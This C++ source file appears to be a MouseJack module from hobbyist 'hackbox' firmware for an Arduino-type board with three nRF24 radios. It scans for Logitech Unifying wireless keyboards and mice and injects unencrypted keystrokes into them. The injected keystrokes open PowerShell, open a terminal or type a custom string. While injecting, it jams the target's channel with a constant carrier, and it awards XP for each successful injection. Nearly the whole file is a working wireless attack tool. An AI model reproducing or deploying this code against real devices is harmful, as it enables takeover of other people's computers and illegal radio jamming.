/*
    hackbox
    hackbox custom firmware
    Copyright (c) 2025 jbohack

    Licensed under the MIT License
    https://opensource.org/licenses/MIT

    SPDX-License-Identifier: MIT
*/

#include <Arduino.h>
#include <SPI.h>
#include <RF24.h>
#include <U8g2lib.h>
#include "../include/mousejack.h"
#include "../include/radio_manager.h"
#include "../include/sleep_manager.h"
#include "../include/display_mirror.h"
#include "../include/pindefs.h"
#include "../include/level_system.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

// --- Radios ---
static RF24 mj_radio1(RADIO_CE_PIN_1, RADIO_CSN_PIN_1, 16000000);
static RF24 mj_radio2(RADIO_CE_PIN_2, RADIO_CSN_PIN_2, 16000000);
static RF24 mj_radio3(RADIO_CE_PIN_3, RADIO_CSN_PIN_3, 16000000);

// --- Constants ---
static const uint8_t CHANNEL_MIN = 2;
static const uint8_t CHANNEL_MAX = 83;
static const int MAX_DEVICES = 20;
static const uint8_t PROMISC_ADDR[] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA};

// --- USB HID Keycodes ---
static const uint8_t HID_KEY_NONE       = 0x00;
static const uint8_t HID_KEY_A          = 0x04;
static const uint8_t HID_KEY_B          = 0x05;
static const uint8_t HID_KEY_C          = 0x06;
static const uint8_t HID_KEY_D          = 0x07;
static const uint8_t HID_KEY_E          = 0x08;
static const uint8_t HID_KEY_F          = 0x09;
static const uint8_t HID_KEY_G          = 0x0A;
static const uint8_t HID_KEY_H          = 0x0B;
static const uint8_t HID_KEY_I          = 0x0C;
static const uint8_t HID_KEY_J          = 0x0D;
static const uint8_t HID_KEY_K          = 0x0E;
static const uint8_t HID_KEY_L          = 0x0F;
static const uint8_t HID_KEY_M          = 0x10;
static const uint8_t HID_KEY_N          = 0x11;
static const uint8_t HID_KEY_O          = 0x12;
static const uint8_t HID_KEY_P          = 0x13;
static const uint8_t HID_KEY_Q          = 0x14;
static const uint8_t HID_KEY_R          = 0x15;
static const uint8_t HID_KEY_S          = 0x16;
static const uint8_t HID_KEY_T          = 0x17;
static const uint8_t HID_KEY_U          = 0x18;
static const uint8_t HID_KEY_V          = 0x19;
static const uint8_t HID_KEY_W          = 0x1A;
static const uint8_t HID_KEY_X          = 0x1B;
static const uint8_t HID_KEY_Y          = 0x1C;
static const uint8_t HID_KEY_Z          = 0x1D;
static const uint8_t HID_KEY_1          = 0x1E;
static const uint8_t HID_KEY_2          = 0x1F;
static const uint8_t HID_KEY_3          = 0x20;
static const uint8_t HID_KEY_4          = 0x21;
static const uint8_t HID_KEY_5          = 0x22;
static const uint8_t HID_KEY_6          = 0x23;
static const uint8_t HID_KEY_7          = 0x24;
static const uint8_t HID_KEY_8          = 0x25;
static const uint8_t HID_KEY_9          = 0x26;
static const uint8_t HID_KEY_0          = 0x27;
static const uint8_t HID_KEY_ENTER      = 0x28;
static const uint8_t HID_KEY_ESCAPE     = 0x29;
static const uint8_t HID_KEY_BACKSPACE  = 0x2A;
static const uint8_t HID_KEY_TAB        = 0x2B;
static const uint8_t HID_KEY_SPACE      = 0x2C;
static const uint8_t HID_KEY_MINUS      = 0x2D;
static const uint8_t HID_KEY_EQUAL      = 0x2E;
static const uint8_t HID_KEY_LBRACKET   = 0x2F;
static const uint8_t HID_KEY_RBRACKET   = 0x30;
static const uint8_t HID_KEY_BACKSLASH  = 0x31;
static const uint8_t HID_KEY_SEMICOLON  = 0x33;
static const uint8_t HID_KEY_QUOTE      = 0x34;
static const uint8_t HID_KEY_GRAVE      = 0x35;
static const uint8_t HID_KEY_COMMA      = 0x36;
static const uint8_t HID_KEY_PERIOD     = 0x37;
static const uint8_t HID_KEY_SLASH      = 0x38;

// Modifier keys
static const uint8_t MOD_NONE      = 0x00;
static const uint8_t MOD_LCTRL     = 0x01;
static const uint8_t MOD_LSHIFT    = 0x02;
static const uint8_t MOD_LALT      = 0x04;
static const uint8_t MOD_LGUI      = 0x08;  // Windows/Super key

// --- Device struct ---
struct MouseJackDevice {
  uint8_t address[5];
  uint8_t channel;
  char type[16];
  int8_t rssi;
  unsigned long lastSeen;
};

// --- State machine ---
enum MJState {
  MJ_SCAN,
  MJ_DEVICE_LIST,
  MJ_ATTACK,
  MJ_RUNNING,
  MJ_CUSTOM_INPUT
};

static MJState mjState = MJ_SCAN;
static MouseJackDevice devices[MAX_DEVICES];
static int deviceCount = 0;
static int selectedDevice = -1;
static int scrollOffset = 0;
static int attackOption = 0;
static uint8_t currentChannel = CHANNEL_MIN;
static unsigned long lastScanTime = 0;
static unsigned long lastButtonPress = 0;
static const unsigned long debounceDelay = 200;
static bool needsRedraw = true;
static bool isScanning = false;
static bool isJamming = false;
static unsigned long packetsSent = 0;
static bool injectionComplete = false;

// Custom input state
static char customStr[33];
static int customLen = 0;
static int customCharIdx = 0;
static const char CHARSET[] = "abcdefghijklmnopqrstuvwxyz0123456789 .,-_/\\:;!?@#$%^&*()";
static const int CHARSET_LEN = 56;

// --- Scan helpers ---

static void initScanRadio() {
  mj_radio1.begin();
  mj_radio1.setAutoAck(false);
  mj_radio1.stopListening();
  mj_radio1.setRetries(0, 0);
  mj_radio1.setPALevel(RF24_PA_MAX, true);
  mj_radio1.setDataRate(RF24_2MBPS);
  mj_radio1.setCRCLength(RF24_CRC_DISABLED);
  mj_radio1.setPayloadSize(32);
  mj_radio1.openReadingPipe(0, PROMISC_ADDR);
  mj_radio1.disableCRC();
}

static void initInjectRadio(uint8_t* addr, uint8_t channel) {
  mj_radio2.begin();
  mj_radio2.setAutoAck(true);
  mj_radio2.stopListening();
  mj_radio2.setRetries(5, 15);
  mj_radio2.setPALevel(RF24_PA_MAX, true);
  mj_radio2.setDataRate(RF24_2MBPS);
  mj_radio2.setCRCLength(RF24_CRC_16);
  mj_radio2.setPayloadSize(22);
  mj_radio2.openWritingPipe(addr);
  mj_radio2.setChannel(channel);
}

static void startJammer(uint8_t channel) {
  mj_radio3.begin();
  mj_radio3.setAutoAck(false);
  mj_radio3.stopListening();
  mj_radio3.setPALevel(RF24_PA_MAX, true);
  mj_radio3.startConstCarrier(RF24_PA_MAX, channel);
  isJamming = true;
}

static void stopJammer() {
  if (isJamming) {
    mj_radio3.stopConstCarrier();
    mj_radio3.powerDown();
    isJamming = false;
  }
}

// Check if address already known
static int findDevice(uint8_t* addr) {
  for (int i = 0; i < deviceCount; i++) {
    if (memcmp(devices[i].address, addr, 5) == 0) {
      return i;
    }
  }
  return -1;
}

// Classify packet type based on Logitech Unifying protocol byte
static const char* classifyPacket(uint8_t typeByte) {
  switch (typeByte) {
    case 0x00: return "Keepalive";
    case 0x10: return "Mouse";
    case 0x20: return "Keyboard";
    case 0x40: return "Multimedia";
    case 0x4F: return "Mouse";
    case 0xC1: return "Pairing";
    case 0xC2: return "Pairing2";
    default:   return "Unknown";
  }
}

// Try to extract device address and type from raw promiscuous packet
static bool processRawPacket(uint8_t* raw, uint8_t len) {
  if (len < 10) return false;

  // Look for Logitech Unifying preamble patterns in raw data.
  // Devices use addresses that frequently start with known bytes.
  // In promiscuous mode with 0xAA address, we see the preamble
  // followed by the actual address bytes and payload.

  // Strategy: scan for valid-looking Logitech packet structures.
  // A Logitech Unifying packet typically has:
  //   [addr(5)] [payload with type byte] [checksum]
  // After our 0xAA preamble match, the remaining bytes contain
  // the tail end of the real address + payload.

  for (int offset = 0; offset < (int)len - 9; offset++) {
    uint8_t typeByte = raw[offset + 5]; // potential type field

    // Check for known Logitech type bytes
    bool validType = (typeByte == 0x00 || typeByte == 0x10 ||
                      typeByte == 0x20 || typeByte == 0x40 ||
                      typeByte == 0x4F || typeByte == 0xC1 ||
                      typeByte == 0xC2);

    if (!validType) continue;

    // Extract the 5-byte address preceding the type byte
    uint8_t addr[5];
    memcpy(addr, &raw[offset], 5);

    // Reject all-zero or all-FF addresses
    bool allZero = true, allFF = true;
    for (int i = 0; i < 5; i++) {
      if (addr[i] != 0x00) allZero = false;
      if (addr[i] != 0xFF) allFF = false;
    }
    if (allZero || allFF) continue;

    // Reject if address matches our promiscuous address
    if (memcmp(addr, PROMISC_ADDR, 5) == 0) continue;

    // We found something plausible
    int idx = findDevice(addr);
    if (idx >= 0) {
      devices[idx].lastSeen = millis();
      devices[idx].channel = currentChannel;
      return false; // already known
    }

    if (deviceCount >= MAX_DEVICES) return false;

    // Store new device
    MouseJackDevice& dev = devices[deviceCount];
    memcpy(dev.address, addr, 5);
    dev.channel = currentChannel;
    const char* devType = classifyPacket(typeByte);
    strncpy(dev.type, devType, sizeof(dev.type) - 1);
    dev.type[sizeof(dev.type) - 1] = '\0';
    dev.rssi = -40; // NRF24 has no real RSSI, estimate from RPD
    dev.lastSeen = millis();
    deviceCount++;

    addXP(5); // XP for finding a device
    return true;
  }

  return false;
}

// Scan one channel for ~128us, check RPD, read packets if carrier detected
static void scanChannel(uint8_t ch) {
  currentChannel = ch;
  mj_radio1.setChannel(ch);
  mj_radio1.startListening();
  delayMicroseconds(128);

  if (mj_radio1.testRPD()) {
    // Carrier detected on this channel, try to read packets
    unsigned long listenStart = micros();
    while (micros() - listenStart < 2000) { // listen for 2ms max
      if (mj_radio1.available()) {
        uint8_t buf[32];
        mj_radio1.read(buf, sizeof(buf));
        processRawPacket(buf, 32);
      }
    }
  }

  mj_radio1.stopListening();
}

// --- HID keystroke injection ---

// Convert ASCII char to HID keycode + modifier
static void charToHID(char c, uint8_t &keycode, uint8_t &modifier) {
  modifier = MOD_NONE;
  keycode = HID_KEY_NONE;

  if (c >= 'a' && c <= 'z') {
    keycode = HID_KEY_A + (c - 'a');
  } else if (c >= 'A' && c <= 'Z') {
    keycode = HID_KEY_A + (c - 'A');
    modifier = MOD_LSHIFT;
  } else if (c >= '1' && c <= '9') {
    keycode = HID_KEY_1 + (c - '1');
  } else if (c == '0') {
    keycode = HID_KEY_0;
  } else {
    switch (c) {
      case ' ':  keycode = HID_KEY_SPACE; break;
      case '\n': keycode = HID_KEY_ENTER; break;
      case '\t': keycode = HID_KEY_TAB; break;
      case '-':  keycode = HID_KEY_MINUS; break;
      case '=':  keycode = HID_KEY_EQUAL; break;
      case '[':  keycode = HID_KEY_LBRACKET; break;
      case ']':  keycode = HID_KEY_RBRACKET; break;
      case '\\': keycode = HID_KEY_BACKSLASH; break;
      case ';':  keycode = HID_KEY_SEMICOLON; break;
      case '\'': keycode = HID_KEY_QUOTE; break;
      case '`':  keycode = HID_KEY_GRAVE; break;
      case ',':  keycode = HID_KEY_COMMA; break;
      case '.':  keycode = HID_KEY_PERIOD; break;
      case '/':  keycode = HID_KEY_SLASH; break;
      case '!':  keycode = HID_KEY_1; modifier = MOD_LSHIFT; break;
      case '@':  keycode = HID_KEY_2; modifier = MOD_LSHIFT; break;
      case '#':  keycode = HID_KEY_3; modifier = MOD_LSHIFT; break;
      case '$':  keycode = HID_KEY_4; modifier = MOD_LSHIFT; break;
      case '%':  keycode = HID_KEY_5; modifier = MOD_LSHIFT; break;
      case '^':  keycode = HID_KEY_6; modifier = MOD_LSHIFT; break;
      case '&':  keycode = HID_KEY_7; modifier = MOD_LSHIFT; break;
      case '*':  keycode = HID_KEY_8; modifier = MOD_LSHIFT; break;
      case '(':  keycode = HID_KEY_9; modifier = MOD_LSHIFT; break;
      case ')':  keycode = HID_KEY_0; modifier = MOD_LSHIFT; break;
      case '_':  keycode = HID_KEY_MINUS; modifier = MOD_LSHIFT; break;
      case '+':  keycode = HID_KEY_EQUAL; modifier = MOD_LSHIFT; break;
      case ':':  keycode = HID_KEY_SEMICOLON; modifier = MOD_LSHIFT; break;
      case '"':  keycode = HID_KEY_QUOTE; modifier = MOD_LSHIFT; break;
      case '?':  keycode = HID_KEY_SLASH; modifier = MOD_LSHIFT; break;
      default:   keycode = HID_KEY_SPACE; break;
    }
  }
}

// Send a single HID keyboard report (unencrypted, for vulnerable devices)
static bool sendKeystroke(uint8_t modifier, uint8_t keycode) {
  uint8_t payload[22];
  memset(payload, 0, sizeof(payload));
  payload[0] = 0x00;      // HID report
  payload[1] = 0xC1;      // Keyboard HID type
  payload[2] = modifier;  // Modifier keys
  payload[3] = 0x00;      // Reserved
  payload[4] = keycode;   // Key

  bool ok = mj_radio2.write(payload, sizeof(payload));
  if (ok) packetsSent++;

  // Key release
  delay(5);
  memset(payload, 0, sizeof(payload));
  payload[0] = 0x00;
  payload[1] = 0xC1;
  mj_radio2.write(payload, sizeof(payload));
  packetsSent++;

  delay(10); // inter-keystroke delay
  return ok;
}

// Send a modifier combo (e.g. Win+R)
static bool sendModifierCombo(uint8_t modifier, uint8_t keycode) {
  bool ok = sendKeystroke(modifier, keycode);
  delay(50); // let the OS process it
  return ok;
}

// Type a string one character at a time
static void typeString(const char* str) {
  for (int i = 0; str[i] != '\0'; i++) {
    uint8_t keycode, modifier;
    charToHID(str[i], keycode, modifier);
    sendKeystroke(modifier, keycode);
  }
}

// Attack payloads
static void attackOpenPowershell() {
  // Win+R to open Run dialog
  sendModifierCombo(MOD_LGUI, HID_KEY_R);
  delay(500);

  // Type "powershell" and press Enter
  typeString("powershell");
  delay(100);
  sendKeystroke(MOD_NONE, HID_KEY_ENTER);
}

static void attackOpenTerminal() {
  // Ctrl+Alt+T for Linux terminal
  sendModifierCombo(MOD_LCTRL | MOD_LALT, HID_KEY_T);
}

static void attackCustomString(const char* str) {
  typeString(str);
}

// --- Drawing functions ---

static void drawScanScreen() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 10, "MouseJack Scanner");

  u8g2.setFont(u8g2_font_5x8_tr);

  char chStr[24];
  snprintf(chStr, sizeof(chStr), "Channel: %d/%d", currentChannel, CHANNEL_MAX);
  u8g2.drawStr(0, 24, chStr);

  char devStr[24];
  snprintf(devStr, sizeof(devStr), "Devices: %d", deviceCount);
  u8g2.drawStr(0, 34, devStr);

  // Progress bar
  int barWidth = 100;
  int barX = 14;
  int barY = 42;
  int barH = 6;
  u8g2.drawFrame(barX, barY, barWidth, barH);
  int fill = ((currentChannel - CHANNEL_MIN) * barWidth) / (CHANNEL_MAX - CHANNEL_MIN + 1);
  if (fill > 0) {
    u8g2.drawBox(barX, barY, fill, barH);
  }

  u8g2.drawStr(0, 62, "Scanning...  L=Exit");

  u8g2.sendBuffer();
  displayMirrorSend(u8g2);
}

static void drawDeviceList() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);

  if (deviceCount == 0) {
    u8g2.drawStr(0, 10, "No Devices Found");
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 28, "L=Exit  (rescan on re-enter)");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
    return;
  }

  u8g2.drawStr(0, 10, "Found Devices:");

  u8g2.setFont(u8g2_font_5x8_tr);

  int visibleItems = 4;
  for (int i = 0; i < visibleItems && (scrollOffset + i) < deviceCount; i++) {
    int idx = scrollOffset + i;
    MouseJackDevice& dev = devices[idx];

    char line[32];
    snprintf(line, sizeof(line), "%s %s ch%d",
             (idx == selectedDevice) ? ">" : " ",
             dev.type,
             dev.channel);
    u8g2.drawStr(0, 20 + (i * 9), line);
  }

  // Scrollbar
  if (deviceCount > visibleItems) {
    int sbX = 124;
    int sbY = 12;
    int sbH = 36;
    u8g2.drawFrame(sbX, sbY, 3, sbH);
    int thumbH = max(4, (sbH * visibleItems) / deviceCount);
    int thumbY = sbY + ((scrollOffset * (sbH - thumbH)) / max(1, deviceCount - visibleItems));
    u8g2.drawBox(sbX, thumbY, 3, thumbH);
  }

  u8g2.drawStr(0, 62, "U/D=Scroll  R=Atk  L=Exit");

  u8g2.sendBuffer();
  displayMirrorSend(u8g2);
}

static void drawAttackMenu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 10, "Attack Options:");

  if (selectedDevice < 0 || selectedDevice >= deviceCount) return;

  MouseJackDevice& dev = devices[selectedDevice];
  u8g2.setFont(u8g2_font_5x8_tr);

  char addrStr[24];
  snprintf(addrStr, sizeof(addrStr), "%s ch%d",
           dev.type, dev.channel);
  u8g2.drawStr(0, 20, addrStr);

  const char* options[] = {
    "Open PowerShell",
    "Open Terminal",
    "Type Custom",
    "Jam Only"
  };

  for (int i = 0; i < 4; i++) {
    char line[24];
    snprintf(line, sizeof(line), "%s %s",
             (i == attackOption) ? ">" : " ",
             options[i]);
    u8g2.drawStr(0, 32 + (i * 9), line);
  }

  u8g2.sendBuffer();
  displayMirrorSend(u8g2);
}

static void drawRunningScreen() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);

  if (attackOption == 3) {
    u8g2.drawStr(0, 10, "Jamming Active");
  } else {
    u8g2.drawStr(0, 10, injectionComplete ? "Injection Done" : "Injecting...");
  }

  u8g2.setFont(u8g2_font_5x8_tr);

  if (selectedDevice >= 0 && selectedDevice < deviceCount) {
    MouseJackDevice& dev = devices[selectedDevice];
    char info[32];
    snprintf(info, sizeof(info), "Target: %s ch%d", dev.type, dev.channel);
    u8g2.drawStr(0, 24, info);

    char addrLine[32];
    snprintf(addrLine, sizeof(addrLine), "%02X:%02X:%02X:%02X:%02X",
             dev.address[0], dev.address[1], dev.address[2],
             dev.address[3], dev.address[4]);
    u8g2.drawStr(0, 34, addrLine);
  }

  char pktStr[24];
  snprintf(pktStr, sizeof(pktStr), "Packets: %lu", packetsSent);
  u8g2.drawStr(0, 46, pktStr);

  if (isJamming) {
    u8g2.drawStr(0, 56, "Jammer: ON");
  }

  u8g2.drawStr(68, 62, "L=Stop");

  u8g2.sendBuffer();
  displayMirrorSend(u8g2);
}

static void drawCustomInput() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 10, "Custom Input:");

  u8g2.setFont(u8g2_font_5x8_tr);

  // Show current string
  if (customLen > 0) {
    char display[33];
    strncpy(display, customStr, customLen);
    display[customLen] = '\0';
    // Show last 20 chars if too long
    const char* shown = display;
    if (customLen > 20) shown = display + (customLen - 20);
    u8g2.drawStr(0, 24, shown);
  }

  // Show current character selector
  char charDisplay[24];
  snprintf(charDisplay, sizeof(charDisplay), "Char: [%c]", CHARSET[customCharIdx]);
  u8g2.drawStr(0, 38, charDisplay);

  char lenStr[16];
  snprintf(lenStr, sizeof(lenStr), "Len: %d/32", customLen);
  u8g2.drawStr(80, 38, lenStr);

  u8g2.drawStr(0, 52, "U/D=Char R=Add C=Del");
  u8g2.drawStr(0, 62, "L=Exit  Long R=Send");

  u8g2.sendBuffer();
  displayMirrorSend(u8g2);
}

// --- Main logic ---

static void executeAttack() {
  if (selectedDevice < 0 || selectedDevice >= deviceCount) return;

  MouseJackDevice& dev = devices[selectedDevice];
  packetsSent = 0;
  injectionComplete = false;

  // Start jammer on target channel (using radio 3)
  startJammer(dev.channel);

  if (attackOption == 3) {
    // Jam only mode, no injection needed
    mjState = MJ_RUNNING;
    needsRedraw = true;
    return;
  }

  // Configure injection radio
  initInjectRadio(dev.address, dev.channel);

  mjState = MJ_RUNNING;
  needsRedraw = true;

  // Execute the selected attack
  switch (attackOption) {
    case 0: // Open PowerShell
      attackOpenPowershell();
      injectionComplete = true;
      break;
    case 1: // Open Terminal
      attackOpenTerminal();
      injectionComplete = true;
      break;
    case 2: // Type custom string
      if (customLen > 0) {
        customStr[customLen] = '\0';
        attackCustomString(customStr);
        injectionComplete = true;
      }
      break;
  }

  if (injectionComplete && packetsSent > 0) {
    addXP(20); // XP for successful injection
  }

  needsRedraw = true;
}

void mousejackSetup() {
  mjState = MJ_SCAN;
  deviceCount = 0;
  selectedDevice = 0;
  scrollOffset = 0;
  attackOption = 0;
  currentChannel = CHANNEL_MIN;
  lastScanTime = 0;
  lastButtonPress = 0;
  needsRedraw = true;
  isScanning = true;
  isJamming = false;
  packetsSent = 0;
  injectionComplete = false;
  customLen = 0;
  customCharIdx = 0;
  memset(customStr, 0, sizeof(customStr));

  pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
  pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);
  pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
  pinMode(BUTTON_PIN_CENTER, INPUT_PULLUP);

  SPI.begin();
  delay(100);

  initScanRadio();
  drawScanScreen();
}

void mousejackLoop() {
  unsigned long now = millis();
  bool up = digitalRead(BUTTON_PIN_UP) == LOW;
  bool down = digitalRead(BUTTON_PIN_DOWN) == LOW;
  bool left = digitalRead(BUTTON_PIN_LEFT) == LOW;
  bool right = digitalRead(BUTTON_PIN_RIGHT) == LOW;
  bool center = digitalRead(BUTTON_PIN_CENTER) == LOW;

  switch (mjState) {
    case MJ_SCAN: {
      // Continuous scanning across channels
      if (isScanning) {
        // Scan a batch of channels per loop iteration
        for (int i = 0; i < 4; i++) {
          scanChannel(currentChannel);
          currentChannel++;
          if (currentChannel > CHANNEL_MAX) {
            currentChannel = CHANNEL_MIN;
            // Full sweep complete, show results if any
            if (deviceCount > 0) {
              isScanning = false;
              selectedDevice = 0;
              mjState = MJ_DEVICE_LIST;
              needsRedraw = true;
              mj_radio1.stopListening();
              mj_radio1.powerDown();
              break;
            }
          }
        }

        // Redraw every 200ms during scan
        if (now - lastScanTime > 200) {
          lastScanTime = now;
          needsRedraw = true;
        }
      }

      if (needsRedraw) {
        needsRedraw = false;
        drawScanScreen();
      }
      break;
    }

    case MJ_DEVICE_LIST: {
      if (now - lastButtonPress > debounceDelay) {
        if (up && selectedDevice > 0) {
          selectedDevice--;
          if (selectedDevice < scrollOffset) scrollOffset = selectedDevice;
          needsRedraw = true;
          lastButtonPress = now;
        } else if (down && selectedDevice < deviceCount - 1) {
          selectedDevice++;
          if (selectedDevice >= scrollOffset + 4) scrollOffset = selectedDevice - 3;
          needsRedraw = true;
          lastButtonPress = now;
        } else if (right && deviceCount > 0) {
          // Wait for release so a still-held RIGHT on the next loop iteration
          // doesn't immediately fire executeAttack() on attackOption 0 (the
          // jammer) without the user ever seeing the attack menu. Without
          // this, a single RIGHT press launches the default attack instantly,
          // and the user never gets a chance to scroll devices or cycle
          // attack types.
          while (digitalRead(BUTTON_PIN_RIGHT) == LOW) delay(10);
          attackOption = 0;
          mjState = MJ_ATTACK;
          needsRedraw = true;
          lastButtonPress = millis();
        } else if (left) {
          // Rescan
          deviceCount = 0;
          selectedDevice = 0;
          scrollOffset = 0;
          currentChannel = CHANNEL_MIN;
          isScanning = true;
          mjState = MJ_SCAN;
          initScanRadio();
          needsRedraw = true;
          lastButtonPress = now;
        }
      }

      if (needsRedraw) {
        needsRedraw = false;
        drawDeviceList();
      }
      break;
    }

    case MJ_ATTACK: {
      if (now - lastButtonPress > debounceDelay) {
        if (up) {
          attackOption = (attackOption - 1 + 4) % 4;
          needsRedraw = true;
          lastButtonPress = now;
        } else if (down) {
          attackOption = (attackOption + 1) % 4;
          needsRedraw = true;
          lastButtonPress = now;
        } else if (right) {
          // Same release-wait pattern as DEVICE_LIST -> ATTACK: prevents a
          // held RIGHT press from firing executeAttack on the same physical
          // press that transitioned us into this state. The user must fully
          // release and press RIGHT again to confirm the selected attack.
          while (digitalRead(BUTTON_PIN_RIGHT) == LOW) delay(10);
          if (attackOption == 2) {
            // Go to custom input first
            customLen = 0;
            customCharIdx = 0;
            memset(customStr, 0, sizeof(customStr));
            mjState = MJ_CUSTOM_INPUT;
            needsRedraw = true;
          } else {
            executeAttack();
          }
          lastButtonPress = millis();
        } else if (left) {
          mjState = MJ_DEVICE_LIST;
          needsRedraw = true;
          lastButtonPress = now;
        }
      }

      if (needsRedraw) {
        needsRedraw = false;
        drawAttackMenu();
      }
      break;
    }

    case MJ_RUNNING: {
      if (now - lastButtonPress > debounceDelay) {
        if (left) {
          // Stop attack
          stopJammer();
          mj_radio2.stopListening();
          mj_radio2.powerDown();
          mjState = MJ_ATTACK;
          needsRedraw = true;
          lastButtonPress = now;
        }
      }

      // Redraw periodically in running state
      static unsigned long lastRunDraw = 0;
      if (now - lastRunDraw > 500) {
        lastRunDraw = now;
        needsRedraw = true;
      }

      if (needsRedraw) {
        needsRedraw = false;
        drawRunningScreen();
      }
      break;
    }

    case MJ_CUSTOM_INPUT: {
      if (now - lastButtonPress > debounceDelay) {
        if (up) {
          customCharIdx = (customCharIdx + 1) % CHARSET_LEN;
          needsRedraw = true;
          lastButtonPress = now;
        } else if (down) {
          customCharIdx = (customCharIdx - 1 + CHARSET_LEN) % CHARSET_LEN;
          needsRedraw = true;
          lastButtonPress = now;
        } else if (right) {
          // Check for long press (> 500ms) to send
          unsigned long pressStart = now;
          while (digitalRead(BUTTON_PIN_RIGHT) == LOW) {
            if (millis() - pressStart > 500) {
              // Long press: execute with custom string
              executeAttack();
              lastButtonPress = millis();
              goto custom_done;
            }
          }
          // Short press: add character
          if (customLen < 32) {
            customStr[customLen++] = CHARSET[customCharIdx];
            needsRedraw = true;
          }
          lastButtonPress = millis();
          custom_done:;
        } else if (center) {
          // Delete last character. CENTER is used here (not LEFT) because
          // LEFT is now the universal app-exit button — using it here would
          // destroy the user's input the moment they press it.
          if (customLen > 0) {
            customLen--;
            customStr[customLen] = '\0';
            needsRedraw = true;
            while (digitalRead(BUTTON_PIN_CENTER) == LOW) delay(5);
          }
          lastButtonPress = now;
        }
      }

      if (needsRedraw) {
        needsRedraw = false;
        drawCustomInput();
      }
      break;
    }
  }
}

void cleanupMousejack() {
  stopJammer();
  mj_radio1.stopListening();
  mj_radio1.powerDown();
  mj_radio2.stopListening();
  mj_radio2.powerDown();
  mj_radio3.powerDown();
  isScanning = false;
  isJamming = false;
}
